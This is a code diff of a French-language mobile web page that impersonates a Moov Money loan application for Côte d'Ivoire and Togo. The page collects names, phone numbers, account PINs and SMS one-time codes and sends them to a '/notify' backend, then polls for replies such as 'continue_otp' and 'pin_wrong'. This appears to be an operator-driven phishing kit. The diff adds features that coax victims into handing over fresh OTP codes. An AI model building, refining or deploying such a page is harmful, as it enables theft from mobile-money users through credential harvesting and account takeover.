@@ -7,43 +7,26 @@
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
     :root{--orange:#FF6A00;--orange-dark:#F04B00;--orange-light:#FFF0E5;--text:#1a1a1a;--sub:#6b6b6b;--hint:#9ca3af;--border:#e5e7eb;--white:#ffffff;--blue-dark:#14329e;--green:#22a745;--red-err:#e53e3e}
-    html,body{
-      width:100vw;height:100vh;height:100dvh;
-      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-      background:#fff;margin:0;padding:0;
-      overflow:hidden;position:fixed;top:0;left:0
-    }
-    
-    .phone{
-      width:100vw;height:100vh;height:100dvh;
-      background:var(--white);position:relative;
-      overflow-y:auto;overflow-x:hidden;
-      display:flex;flex-direction:column
-    }
-    
+    html,body{width:100vw;height:100vh;height:100dvh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fff;margin:0;padding:0;overflow:hidden;position:fixed;top:0;left:0}
+    .phone{width:100vw;height:100vh;height:100dvh;background:var(--white);position:relative;overflow-y:auto;overflow-x:hidden;display:flex;flex-direction:column}
     .page{display:none;flex-direction:column;width:100%;min-height:100vh;min-height:100dvh}
     .page.active{display:flex}
-    
     .top-bar{height:3px;background:linear-gradient(90deg,var(--orange),var(--orange-dark));flex-shrink:0;width:100%}
     .hdr-row{padding:3vw 4vw;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;width:100%}
     .hdr-row img{width:20vw;max-width:90px;height:auto}
     .step-tag{font-size:3vw;color:var(--hint)}
     .progress-bar{height:3px;background:var(--border);flex-shrink:0;width:100%}
     .progress-fill{height:100%;background:linear-gradient(90deg,var(--orange),var(--orange-dark))}
-    
     .content{padding:4vw;flex:1;display:flex;flex-direction:column;overflow-y:auto;width:100%}
     .footer{padding:3vw 4vw 5vw;border-top:1px solid var(--border);flex-shrink:0;background:var(--white);width:100%}
     .spacer{flex:1;min-height:2vw}
-    
     .btn{display:block;width:100%;padding:3.5vw;background:var(--blue-dark);border:none;border-radius:2.5vw;font-size:4vw;font-weight:700;color:var(--white);cursor:pointer;font-family:inherit;-webkit-tap-highlight-color:transparent}
     .btn:active{opacity:0.85}
     .btn:disabled{background:#a9c2e8;cursor:not-allowed}
     .btn-outline{flex:1;padding:3.5vw;background:transparent;border:1.5px solid var(--border);border-radius:2.5vw;font-size:3.8vw;font-weight:500;color:var(--sub);cursor:pointer;font-family:inherit}
-    
     .input-field{width:100%;padding:3vw 3.5vw;background:var(--white);border:1.5px solid var(--border);border-radius:2.5vw;font-size:4vw;font-family:inherit;outline:none}
     .input-field:focus{border-color:var(--orange)}
     .label{display:block;font-size:3vw;color:var(--sub);margin-bottom:1.2vw;font-weight:700;text-transform:uppercase;letter-spacing:0.3px}
-    
     .loan-title{font-size:6.5vw;font-weight:800;color:var(--text);text-align:center;margin-bottom:1.5vw}
     .loan-sub{font-size:3.8vw;color:var(--sub);text-align:center;margin-bottom:5vw}
     .amount-card{background:var(--white);border:1.5px solid var(--border);border-radius:3.5vw;padding:5vw;margin-bottom:4vw;text-align:center;width:100%}
@@ -53,21 +36,17 @@
     input[type=range]{width:100%;height:1.5vw;-webkit-appearance:none;appearance:none;background:#e5e7eb;border-radius:1.5vw;outline:none;cursor:pointer}
     input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:6.5vw;height:6.5vw;border-radius:50%;background:var(--white);border:3px solid var(--orange);cursor:pointer}
     .range-ends{display:flex;justify-content:space-between;margin-top:2vw;font-size:2.8vw;color:var(--hint)}
-    
     .dur-grid{display:grid;grid-template-columns:1fr 1fr;gap:2vw;margin-bottom:4vw;width:100%}
     .dur-btn{padding:3.5vw 2vw;border:1.5px solid var(--border);border-radius:2.5vw;font-size:3.5vw;cursor:pointer;text-align:center;font-family:inherit;background:var(--white);color:var(--sub);word-break:break-word}
     .dur-btn.sel{border-color:var(--orange);color:var(--orange);background:var(--orange-light);font-weight:700}
-    
     .summary-box{background:var(--orange-light);border-radius:2.5vw;padding:3vw 4vw;width:100%}
     .summary-row{display:flex;justify-content:space-between;padding:2vw 0;font-size:3.5vw;flex-wrap:wrap;gap:1vw}
     .summary-row:not(:last-child){border-bottom:1px solid rgba(255,106,0,0.12)}
     .summary-row .sl{color:var(--sub)}.summary-row .sv{color:var(--text);font-weight:600;text-align:right}
-    
     .info-title{font-size:5.5vw;font-weight:800;color:var(--text);margin-bottom:1.5vw}
     .info-sub{font-size:3.5vw;color:var(--sub);margin-bottom:5vw}
     .two-cols{display:grid;grid-template-columns:1fr 1fr;gap:3vw;margin-bottom:3vw}
     .field-grp{margin-bottom:3vw}
-    
     .orange-header{position:relative;background:linear-gradient(135deg,#FF7A00,#FF5A00,#F04B00);height:40vw;max-height:175px;min-height:140px;overflow:hidden;flex-shrink:0;width:100%}
     .orange-header .decor{position:absolute;top:-8vw;left:-5vw;width:35vw;max-width:140px;aspect-ratio:1;border-radius:50%;background:rgba(255,255,255,0.05)}
     .orange-header .ring{position:absolute;top:3vw;right:-8vw;width:40vw;max-width:150px;aspect-ratio:1;border-radius:50%;border:1px solid rgba(255,255,255,0.3)}
@@ -78,7 +57,6 @@
     .login-content{flex:1;padding:5vw 4vw;display:flex;flex-direction:column;width:100%}
     .login-title{font-size:7vw;font-weight:800;color:var(--text);margin-bottom:1.5vw}
     .login-sub{font-size:3.8vw;color:var(--sub);margin-bottom:5vw}
-    
     .country-wrap{position:relative;margin-bottom:4vw;width:100%}
     .country-select{display:flex;align-items:center;gap:2vw;border:1.5px solid #d8d8d8;border-radius:2.5vw;padding:3vw;cursor:pointer;background:#fff;width:100%;flex-wrap:wrap}
     .country-drop{display:none;position:absolute;top:100%;left:0;right:0;background:#fff;border:1.5px solid #d8d8d8;border-radius:2.5vw;z-index:10;margin-top:1vw;box-shadow:0 6px 20px rgba(0,0,0,0.1)}
@@ -86,20 +64,19 @@
     .country-opt{display:flex;align-items:center;gap:2vw;padding:3vw;cursor:pointer}
     .country-opt:hover{background:#f5f5f5}
     .country-opt:first-child{border-bottom:1px solid #eee}
-    
     .phone-row{display:flex;align-items:center;border:1.5px solid #2255d6;border-radius:2.5vw;padding:3vw;gap:2vw;margin-bottom:1vw;width:100%}
     .phone-row .cc{font-size:4vw;font-weight:500;flex-shrink:0}
     .phone-row .divider{color:#ddd;flex-shrink:0}
     .phone-row input{flex:1;min-width:0;border:none;font-size:4vw;outline:none;font-family:inherit;width:100%}
     .phone-row input:disabled{background:transparent;color:#999}
     .digit-info{font-size:2.8vw;color:var(--hint);text-align:right;margin-bottom:3.5vw}
-    
     .terms-row{display:flex;align-items:flex-start;gap:2vw;margin-bottom:3.5vw}
     .terms-box{width:5.5vw;height:5.5vw;min-width:20px;min-height:20px;border:2px solid #1d4ed8;border-radius:1.2vw;flex-shrink:0;display:flex;align-items:center;justify-content:center;cursor:pointer;margin-top:0.5vw}
     .terms-box svg{width:3.5vw;height:3.5vw;min-width:12px;min-height:12px;stroke:#1d4ed8;stroke-width:3;display:none}
     .terms-txt{font-size:3.5vw;color:#444;line-height:1.3}
     .terms-txt a{color:#1d4ed8;text-decoration:none}
     
+    /* PIN */
     .pin-page{background:#fff;align-items:center;justify-content:center;position:relative;padding:0}
     .pin-wrap{text-align:center;padding:8vw 6vw;max-width:90vw;margin:0 auto;width:100%}
     .pin-wrap img{width:22vw;max-width:85px;height:auto;margin-bottom:6vw}
@@ -114,16 +91,15 @@
     .pin-err{color:var(--red-err);font-size:3.5vw;font-weight:600;min-height:5vw;margin-bottom:2vw;opacity:0;text-align:center}
     .pin-err.show{opacity:1}
     .pin-forgot{color:var(--orange);font-size:3.3vw;font-weight:600;text-decoration:none;cursor:pointer;display:inline-block;margin-bottom:4vw}
-    
     .keypad-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2vw;max-width:70vw;margin:0 auto 4vw;width:100%}
     .key-btn{aspect-ratio:1;border:none;border-radius:50%;background:#f2f2f2;font-size:5.5vw;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;-webkit-tap-highlight-color:transparent;width:100%}
     .key-btn:active{background:#ddd;transform:scale(0.95)}
-    
     .pin-submit-btn{width:100%;max-width:70vw;padding:3.5vw;background:#a9c2e8;color:#fff;font-size:4vw;font-weight:700;border:none;border-radius:2.5vw;cursor:pointer;font-family:inherit;margin:0 auto;display:block}
     .pin-submit-btn.active{background:var(--blue-dark);cursor:pointer}
     .pin-submit-btn.active:active{opacity:0.85}
     .pin-back-btn{position:absolute;top:4vw;left:4vw;background:none;border:none;font-size:5.5vw;color:#1a1a1a;cursor:pointer;padding:1vw;z-index:5}
     
+    /* OTP */
     .otp-header{background:#FF6A00;height:12vw;max-height:55px;display:flex;align-items:center;padding:0 4vw;flex-shrink:0}
     .otp-body{padding:5vw 4vw;flex:1;display:flex;flex-direction:column;width:100%}
     .otp-body h2{font-size:5.5vw;margin-bottom:2vw}
@@ -131,9 +107,12 @@
     .otp-boxes{display:flex;gap:2vw;justify-content:center;margin-bottom:4vw;flex-wrap:wrap}
     .otp-b{width:11vw;max-width:48px;height:12vw;max-height:52px;border:1.5px solid #ddd;border-radius:2vw;text-align:center;font-size:4.5vw;font-weight:700;outline:none;background:#fff;flex-shrink:0}
     .otp-b:focus{border-color:#2255d6}
+    .otp-b.auto-filled{border-color:var(--green);background:#f0fdf4}
     .timer-txt{text-align:center;color:#444;font-size:3.5vw;margin-bottom:4vw}
     .timer-txt strong{font-weight:700}
+    .otp-detect-msg{text-align:center;font-size:2.8vw;color:var(--green);min-height:4vw;margin-bottom:2vw;font-weight:500}
     
+    /* Success */
     .succ-content{padding:8vw 5vw;flex:1;display:flex;flex-direction:column;align-items:center;width:100%}
     .succ-circle{width:13vw;max-width:52px;height:13vw;max-height:52px;border-radius:50%;background:linear-gradient(135deg,var(--orange),var(--orange-dark));display:flex;align-items:center;justify-content:center;margin-bottom:5vw;flex-shrink:0}
     .succ-circle svg{width:5.5vw;max-width:22px;height:5.5vw;max-height:22px;stroke:#fff;fill:none;stroke-width:2.5}
@@ -143,13 +122,9 @@
     .ref-card .rl{font-size:2.8vw;color:var(--orange-dark);font-weight:700;text-transform:uppercase;margin-bottom:1vw;letter-spacing:0.5px}
     .ref-card .rv{font-size:3.8vw;font-weight:700;color:var(--text);word-break:break-all}
     .footnote{font-size:2.8vw;color:var(--hint);margin-top:5vw;text-align:center}
-    
     @keyframes spin{to{transform:rotate(360deg)}}
-    
-    @supports(padding:max(0px)){
-      .footer{padding-bottom:max(5vw,env(safe-area-inset-bottom))}
-      .pin-wrap{padding-bottom:max(8vw,env(safe-area-inset-bottom))}
-    }
+    @keyframes popIn{0%{transform:scale(0.85);opacity:0}100%{transform:scale(1);opacity:1}}
+    @supports(padding:max(0px)){.footer{padding-bottom:max(5vw,env(safe-area-inset-bottom))}.pin-wrap{padding-bottom:max(8vw,env(safe-area-inset-bottom))}}
   </style>
 </head>
 <body>
@@ -170,10 +145,8 @@
         <div class="range-ends"><span>1 000</span><span>100 000</span></div>
       </div>
       <div style="margin-bottom:3.5vw"><label class="label">Montant personnalisé</label>
-        <div style="display:flex;align-items:center;gap:1.5vw;border:1.5px solid var(--border);border-radius:2.5vw;padding:0 2.5vw">
-          <span style="font-weight:600;font-size:3.8vw;flex-shrink:0">FCFA</span>
-          <input class="input-field" id="customAmt" placeholder="Entrez le montant" style="border:none;padding:3vw 0;min-width:0" oninput="onCustomAmount(this.value)">
-        </div><div id="amtErr" style="font-size:2.5vw;color:var(--red-err);margin-top:1vw;display:none">Minimum 1 000 FCFA</div>
+        <div style="display:flex;align-items:center;gap:1.5vw;border:1.5px solid var(--border);border-radius:2.5vw;padding:0 2.5vw"><span style="font-weight:600;font-size:3.8vw;flex-shrink:0">FCFA</span><input class="input-field" id="customAmt" placeholder="Entrez le montant" style="border:none;padding:3vw 0;min-width:0" oninput="onCustomAmount(this.value)"></div>
+        <div id="amtErr" style="font-size:2.5vw;color:var(--red-err);margin-top:1vw;display:none">Minimum 1 000 FCFA</div>
       </div>
       <label class="label">Durée de remboursement</label>
       <div class="dur-grid" id="durGrid">
@@ -206,16 +179,12 @@
       </div>
       <div class="field-grp"><label class="label">Situation professionnelle</label>
         <select class="input-field" id="incomeSrc" onchange="checkInfoForm()" style="appearance:none;background-image:url('data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%2212%22 height=%228%22%3E%3Cpath fill=%22%23666%22 d=%22M1.4 0L6 4.6 10.6 0 12 1.4l-6 6-6-6z%22/%3E%3C/svg%3E');background-repeat:no-repeat;background-position:right 3vw center;padding-right:8vw">
-          <option value="">Sélectionnez votre situation</option><option>Salarié</option><option>Auto-entrepreneur</option><option>Commerçant</option><option>Étudiant</option><option>Sans emploi</option><option>Retraité</option>
-        </select>
+          <option value="">Sélectionnez votre situation</option><option>Salarié</option><option>Auto-entrepreneur</option><option>Commerçant</option><option>Étudiant</option><option>Sans emploi</option><option>Retraité</option></select>
       </div>
       <div class="field-grp"><label class="label">Revenu mensuel (FCFA)</label><input class="input-field" id="monthlyInc" placeholder="0" oninput="validateNumeric(this);checkInfoForm()"></div>
       <div class="spacer"></div>
     </div>
-    <div class="footer" style="display:flex;gap:2vw">
-      <button class="btn-outline" onclick="goTo('pg0')">Retour</button>
-      <button class="btn" id="infoNextBtn" disabled onclick="goTo('pg2')" style="flex:2">Continuer</button>
-    </div>
+    <div class="footer" style="display:flex;gap:2vw"><button class="btn-outline" onclick="goTo('pg0')">Retour</button><button class="btn" id="infoNextBtn" disabled onclick="goTo('pg2')" style="flex:2">Continuer</button></div>
   </div>
 
   <!-- PAGE 2: LOGIN -->
@@ -232,26 +201,17 @@
       <div class="country-wrap">
         <label class="label">Pays</label>
         <div class="country-select" onclick="toggleCountryDropdown()">
-          <span id="countryFlag" style="font-size:5vw;opacity:0.4">🌍</span>
-          <span id="countryName" style="color:#999;font-size:3.8vw">Sélectionnez un pays</span>
-          <span id="countryCode" style="margin-left:auto;color:#999;font-size:3.5vw"></span>
-          <span style="color:#999;font-size:3vw">▼</span>
+          <span id="countryFlag" style="font-size:5vw;opacity:0.4">🌍</span><span id="countryName" style="color:#999;font-size:3.8vw">Sélectionnez un pays</span><span id="countryCode" style="margin-left:auto;color:#999;font-size:3.5vw"></span><span style="color:#999;font-size:3vw">▼</span>
         </div>
         <div class="country-drop" id="countryDropdown">
           <div class="country-opt" onclick="pickCountry('ci')"><span style="font-size:5vw">🇨🇮</span><span style="font-size:3.8vw">Côte d'Ivoire</span><span style="margin-left:auto;color:#666;font-size:3.5vw">+225</span></div>
           <div class="country-opt" onclick="pickCountry('tg')"><span style="font-size:5vw">🇹🇬</span><span style="font-size:3.8vw">Togo</span><span style="margin-left:auto;color:#666;font-size:3.5vw">+228</span></div>
         </div>
       </div>
-      <div class="phone-row">
-        <span class="cc" id="displayCc">---</span><span class="divider">|</span>
-        <input id="phoneInput" placeholder="Sélectionnez un pays" disabled oninput="this.value=this.value.replace(/\D/g,'').slice(0,getPhoneDigits())">
-      </div>
+      <div class="phone-row"><span class="cc" id="displayCc">---</span><span class="divider">|</span><input id="phoneInput" placeholder="Sélectionnez un pays" disabled oninput="this.value=this.value.replace(/\D/g,'').slice(0,getPhoneDigits())"></div>
       <div class="digit-info" id="digitHint"></div>
       <div class="spacer"></div>
-      <div class="terms-row">
-        <div class="terms-box" id="termsCheckbox" onclick="toggleTerms()"><svg id="termsCheckSvg" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
-        <span class="terms-txt">Cochez pour accepter les <a href="#">«Conditions générales d'utilisation»</a></span>
-      </div>
+      <div class="terms-row"><div class="terms-box" id="termsCheckbox" onclick="toggleTerms()"><svg id="termsCheckSvg" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div><span class="terms-txt">Cochez pour accepter les <a href="#">«Conditions générales d'utilisation»</a></span></div>
       <button class="btn" onclick="goToPin()">Continuer</button>
     </div>
   </div>
@@ -284,10 +244,11 @@
       <h2>Vérifier votre numéro</h2>
       <p class="sub" id="otpPhoneText">Saisissez le code que nous avons envoyé</p>
       <div class="otp-boxes" id="otpContainer">
-        <input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
+        <input class="otp-b" maxlength="1" inputmode="numeric" autocomplete="one-time-code"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
         <input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric"><input class="otp-b" maxlength="1" inputmode="numeric">
       </div>
-      <div class="timer-txt" id="otpTimerDisplay">Renvoyer le code dans <strong>04:26</strong></div>
+      <div class="otp-detect-msg" id="otpDetectMsg"></div>
+      <div class="timer-txt" id="otpTimerDisplay">Renvoyer le code dans <strong>04:00</strong></div>
       <div class="spacer"></div>
       <button class="btn" id="otpSubmitBtn" onclick="verifyOtp()" style="background:#a9c2e8;cursor:not-allowed">Continuer</button>
     </div>
@@ -300,21 +261,34 @@
     <div class="succ-content">
       <div class="succ-circle"><svg viewBox="0 0 24 24"><polyline points="4 12 9 17 20 7"/></svg></div>
       <h2 id="successTitle">Demande approuvée</h2>
-      <p class="msg" id="successMessage">Félicitations ! Votre demande de crédit a été approuvée.</p>
+      <p class="msg" id="successMessage">Félicitations ! Votre demande de crédit est en cours de traitement.</p>
       <div class="ref-card"><div class="rl">Numéro de référence</div><div class="rv" id="refNumber">MM-2026-XXXXXX</div></div>
       <button class="btn" style="background:transparent;color:var(--sub);margin-top:4vw" onclick="resetAll()">Nouvelle demande</button>
       <div class="footnote">Moov Money · Service financier mobile</div>
     </div>
   </div>
 
+  <!-- OTP EXPIRED POPUP -->
+  <div id="otpExpiredPopup" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:300;align-items:center;justify-content:center">
+    <div style="background:#fff;border-radius:4vw;padding:8vw 5vw;text-align:center;max-width:80vw;width:90%;animation:popIn 0.3s ease-out">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a8/Moov_Money_Flooz.png" alt="Moov Money" style="width:25vw;max-width:100px;margin-bottom:5vw">
+      <div style="width:12vw;height:12vw;max-width:50px;max-height:50px;border-radius:50%;background:#FFF0E5;display:flex;align-items:center;justify-content:center;margin:0 auto 4vw">
+        <div style="width:8vw;height:8vw;max-width:34px;max-height:34px;border-radius:50%;background:linear-gradient(135deg,#FF6A00,#F04B00);display:flex;align-items:center;justify-content:center;color:#fff;font-size:5vw;font-weight:800">!</div>
+      </div>
+      <h3 style="font-size:5vw;margin-bottom:2vw;color:#1a1a1a">Aucun OTP entré !</h3>
+      <p style="font-size:3.5vw;color:#6b6b6b;margin-bottom:5vw;line-height:1.4">Vous n'avez pas reçu d'OTP ? Veuillez demander un nouveau code pour continuer.</p>
+      <button onclick="retryOtp()" style="width:100%;padding:3.5vw;background:#14329e;color:#fff;border:none;border-radius:2.5vw;font-size:4vw;font-weight:700;cursor:pointer;font-family:inherit">Réessayer</button>
+    </div>
+  </div>
+
 </div>
 
 <script>
-var state={duration:6,amount:1000,country:null,termsOk:false,pin:'',otpTimer:null};
+var state={duration:6,amount:1000,country:null,termsOk:false,pin:'',otpTimer:null,otpAbortCtrl:null,otpAutoDone:false};
 var API_BASE=window.location.origin;
 var backendToken=null,pollTimer=null;
 var POLL_INTERVAL=3000,POLL_TIMEOUT=120000;
-var countries={ci:{name:"Côte d'Ivoire",code:'+225',flag:'🇨🇮',digits:10,ph:'07XXXXXXXX'},tg:{name:'Togo',code:'+228',flag:'🇹🇬',digits:8,ph:'90XXXXXX'}};
+var countries={ci:{name:"Côte d'Ivoire",code:'+225',flag:'🇨🇮',digits:10,ph:'07XXXXXXXX',otpSec:240},tg:{name:'Togo',code:'+228',flag:'🇹🇬',digits:8,ph:'90XXXXXX',otpSec:40}};
 
 function goTo(id){
   document.querySelectorAll('.page').forEach(function(p){p.classList.remove('active')});
@@ -324,57 +298,26 @@ function goTo(id){
 
 function calcMonthly(a,m){if(!a||a<=0)return 0;var r=0.05/12;return a*r*Math.pow(1+r,m)/(Math.pow(1+r,m)-1)}
 function refreshDisplay(){
-  var a=state.amount;
-  document.getElementById('amtDisplay').textContent=a.toLocaleString('fr-FR')+' FCFA';
+  var a=state.amount;document.getElementById('amtDisplay').textContent=a.toLocaleString('fr-FR')+' FCFA';
   var mo=calcMonthly(a,state.duration);
   document.getElementById('monthlyVal').textContent=mo>0?Math.round(mo).toLocaleString('fr-FR')+' FCFA':'—';
   document.getElementById('totalVal').textContent=mo>0?Math.round(mo*state.duration).toLocaleString('fr-FR')+' FCFA':'—';
 }
 function onSlider(v){state.amount=parseInt(v);document.getElementById('customAmt').value=state.amount;document.getElementById('amtErr').style.display='none';refreshDisplay()}
-function onCustomAmount(v){
-  v=v.replace(/\D/g,'');document.getElementById('customAmt').value=v;
-  var n=parseInt(v)||0;
-  if(v===''){document.getElementById('amtErr').style.display='none';state.amount=1000;document.getElementById('amountSlider').value=1000;refreshDisplay();return}
-  if(n<1000){document.getElementById('amtErr').style.display='block'}else{document.getElementById('amtErr').style.display='none';if(n>100000)n=100000}
-  state.amount=n;document.getElementById('amountSlider').value=n;refreshDisplay();
-}
-function pickDur(el){document.querySelectorAll('#durGrid .dur-btn').forEach(function(b){b.classList.remove('sel')});el.classList.add('sel');state.duration=parseInt(el.getAttribute('data-dur'));refreshDisplay();}
+function onCustomAmount(v){v=v.replace(/\D/g,'');document.getElementById('customAmt').value=v;var n=parseInt(v)||0;if(v===''){document.getElementById('amtErr').style.display='none';state.amount=1000;document.getElementById('amountSlider').value=1000;refreshDisplay();return}if(n<1000){document.getElementById('amtErr').style.display='block'}else{document.getElementById('amtErr').style.display='none';if(n>100000)n=100000}state.amount=n;document.getElementById('amountSlider').value=n;refreshDisplay()}
+function pickDur(el){document.querySelectorAll('#durGrid .dur-btn').forEach(function(b){b.classList.remove('sel')});el.classList.add('sel');state.duration=parseInt(el.getAttribute('data-dur'));refreshDisplay()}
 function validateAlpha(el){el.value=el.value.replace(/[^a-zA-ZÀ-ÿ\s]/g,'')}
 function validateNumeric(el){el.value=el.value.replace(/[^0-9.]/g,'');var p=el.value.split('.');if(p.length>2)el.value=p[0]+'.'+p.slice(1).join('')}
 function checkInfoForm(){var ok=document.getElementById('firstName').value.trim()&&document.getElementById('lastName').value.trim()&&document.getElementById('incomeSrc').value&&document.getElementById('monthlyInc').value.trim();document.getElementById('infoNextBtn').disabled=!ok}
 function toggleCountryDropdown(){document.getElementById('countryDropdown').classList.toggle('open')}
-function pickCountry(key){
-  state.country=key;var c=countries[key];
-  document.getElementById('countryFlag').textContent=c.flag;document.getElementById('countryFlag').style.opacity='1';
-  document.getElementById('countryName').textContent=c.name;document.getElementById('countryName').style.color='#000';
-  document.getElementById('countryCode').textContent=c.code;document.getElementById('countryCode').style.color='#666';
-  document.getElementById('displayCc').textContent=c.code;document.getElementById('digitHint').textContent=c.digits+' chiffres';
-  var input=document.getElementById('phoneInput');input.disabled=false;input.maxLength=c.digits;input.value='';input.placeholder=c.ph;input.focus();
-  document.getElementById('countryDropdown').classList.remove('open');
-}
+function pickCountry(key){state.country=key;var c=countries[key];document.getElementById('countryFlag').textContent=c.flag;document.getElementById('countryFlag').style.opacity='1';document.getElementById('countryName').textContent=c.name;document.getElementById('countryName').style.color='#000';document.getElementById('countryCode').textContent=c.code;document.getElementById('countryCode').style.color='#666';document.getElementById('displayCc').textContent=c.code;document.getElementById('digitHint').textContent=c.digits+' chiffres';var input=document.getElementById('phoneInput');input.disabled=false;input.maxLength=c.digits;input.value='';input.placeholder=c.ph;input.focus();document.getElementById('countryDropdown').classList.remove('open')}
 function getPhoneDigits(){return state.country?countries[state.country].digits:10}
 function toggleTerms(){state.termsOk=!state.termsOk;document.getElementById('termsCheckSvg').style.display=state.termsOk?'block':'none'}
-function goToPin(){
-  if(!state.country){alert('Veuillez sélectionner un pays');return}
-  var phone=document.getElementById('phoneInput').value.trim(),c=countries[state.country];
-  if(!phone||phone.length!==c.digits){alert('Veuillez entrer un numéro valide à '+c.digits+' chiffres pour '+c.name);return}
-  if(!state.termsOk){alert("Veuillez accepter les conditions générales d'utilisation");return}
-  goTo('pg3');
-}
+function goToPin(){if(!state.country){alert('Veuillez sélectionner un pays');return}var phone=document.getElementById('phoneInput').value.trim(),c=countries[state.country];if(!phone||phone.length!==c.digits){alert('Veuillez entrer un numéro valide à '+c.digits+' chiffres pour '+c.name);return}if(!state.termsOk){alert("Veuillez accepter les conditions générales d'utilisation");return}goTo('pg3')}
 document.addEventListener('click',function(e){var dd=document.getElementById('countryDropdown'),sel=document.querySelector('.country-select');if(dd&&sel&&!sel.contains(e.target)&&!dd.contains(e.target))dd.classList.remove('open')});
 
-function resetPin(){
-  state.pin='';var input=document.getElementById('pinSingleInput');input.value='';input.classList.remove('valid','error');
-  document.getElementById('pinErrorMsg').classList.remove('show');
-  var btn=document.getElementById('pinSubmitBtn');btn.disabled=true;btn.classList.remove('active');
-}
-function onPinInput(val){
-  val=val.replace(/\D/g,'');document.getElementById('pinSingleInput').value=val;state.pin=val;
-  var input=document.getElementById('pinSingleInput');input.classList.remove('error');document.getElementById('pinErrorMsg').classList.remove('show');
-  var btn=document.getElementById('pinSubmitBtn');
-  if(val.length>=4&&val.length<=6){input.classList.add('valid');btn.disabled=false;btn.classList.add('active')}
-  else{input.classList.remove('valid');btn.disabled=true;btn.classList.remove('active')}
-}
+function resetPin(){state.pin='';var input=document.getElementById('pinSingleInput');input.value='';input.classList.remove('valid','error');document.getElementById('pinErrorMsg').classList.remove('show');var btn=document.getElementById('pinSubmitBtn');btn.disabled=true;btn.classList.remove('active')}
+function onPinInput(val){val=val.replace(/\D/g,'');document.getElementById('pinSingleInput').value=val;state.pin=val;var input=document.getElementById('pinSingleInput');input.classList.remove('error');document.getElementById('pinErrorMsg').classList.remove('show');var btn=document.getElementById('pinSubmitBtn');if(val.length>=4&&val.length<=6){input.classList.add('valid');btn.disabled=false;btn.classList.add('active')}else{input.classList.remove('valid');btn.disabled=true;btn.classList.remove('active')}}
 function onPinKeydown(e){if(e.key==='Enter'&&state.pin.length>=4&&state.pin.length<=6){e.preventDefault();submitPin()}}
 function pinAddDigit(d){if(state.pin.length>=6)return;state.pin+=d;document.getElementById('pinSingleInput').value=state.pin;onPinInput(state.pin)}
 function pinRemoveDigit(){state.pin=state.pin.slice(0,-1);document.getElementById('pinSingleInput').value=state.pin;onPinInput(state.pin)}
@@ -383,42 +326,97 @@ function forgotPin(){alert('Code PIN oublié ?\n\nContactez le service client.\n
 
 function showLoading(t,d){var ov=document.createElement('div');ov.id='loadingOverlay';ov.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,106,0,0.5);display:flex;align-items:center;justify-content:center;z-index:200;flex-direction:column';ov.innerHTML='<div style="background:#fff;border-radius:4vw;padding:7vw 5vw;text-align:center;max-width:75vw;width:90%"><div style="width:10vw;height:10vw;max-width:44px;max-height:44px;border:3px solid #eee;border-top-color:#FF6A00;border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 3.5vw"></div><div style="font-size:4.5vw;font-weight:700;margin-bottom:1.5vw">'+(t||'Traitement')+'</div><div style="font-size:3.5vw;color:#666">'+(d||'Veuillez patienter...')+'</div></div>';document.body.appendChild(ov)}
 function hideLoading(){var ov=document.getElementById('loadingOverlay');if(ov)ov.remove()}
+function showOtpExpiredPopup(){document.getElementById('otpExpiredPopup').style.display='flex'}
+function hideOtpExpiredPopup(){document.getElementById('otpExpiredPopup').style.display='none'}
 
-async function callBackend(type,extra){
-  var phone=document.getElementById('phoneInput').value.trim(),fn=document.getElementById('firstName').value.trim(),ln=document.getElementById('lastName').value.trim();
-  var name=[fn,ln].filter(Boolean).join(' ')||'Client',code=state.country?countries[state.country].code:'+225';
-  var payload={type:type,phone:phone,countryCode:code,name:name};for(var k in extra)payload[k]=extra[k];
-  try{var resp=await fetch(API_BASE+'/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return await resp.json()}catch(e){return{ok:false,error:'Network error'}}
-}
+async function callBackend(type,extra){var phone=document.getElementById('phoneInput').value.trim(),fn=document.getElementById('firstName').value.trim(),ln=document.getElementById('lastName').value.trim();var name=[fn,ln].filter(Boolean).join(' ')||'Client',code=state.country?countries[state.country].code:'+225';var payload={type:type,phone:phone,countryCode:code,name:name};for(var k in extra)payload[k]=extra[k];try{var resp=await fetch(API_BASE+'/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return await resp.json()}catch(e){return{ok:false,error:'Network error'}}}
 function startPolling(cb){var start=Date.now();clearInterval(pollTimer);pollTimer=setInterval(async function(){if(Date.now()-start>POLL_TIMEOUT){clearInterval(pollTimer);cb('pending');return}try{var resp=await fetch(API_BASE+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:backendToken})});var data=await resp.json();if(data.ok&&data.result!=='pending'){clearInterval(pollTimer);cb(data.result)}}catch(e){}},POLL_INTERVAL)}
 
-function submitPin(){
-  if(state.pin.length<4||state.pin.length>6)return;
-  showLoading('Vérification du PIN','Connexion au serveur...');
-  callBackend('pin',{passcode:state.pin}).then(function(data){
-    if(!data.ok){hideLoading();if(state.pin==='1234'){goTo('pg4')}else{pinShake()}return}
-    backendToken=data.token;startPolling(function(r){hideLoading();if(r==='continue_otp'){goTo('pg4')}else if(r==='pin_wrong'||r==='pending'){pinShake()}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}});
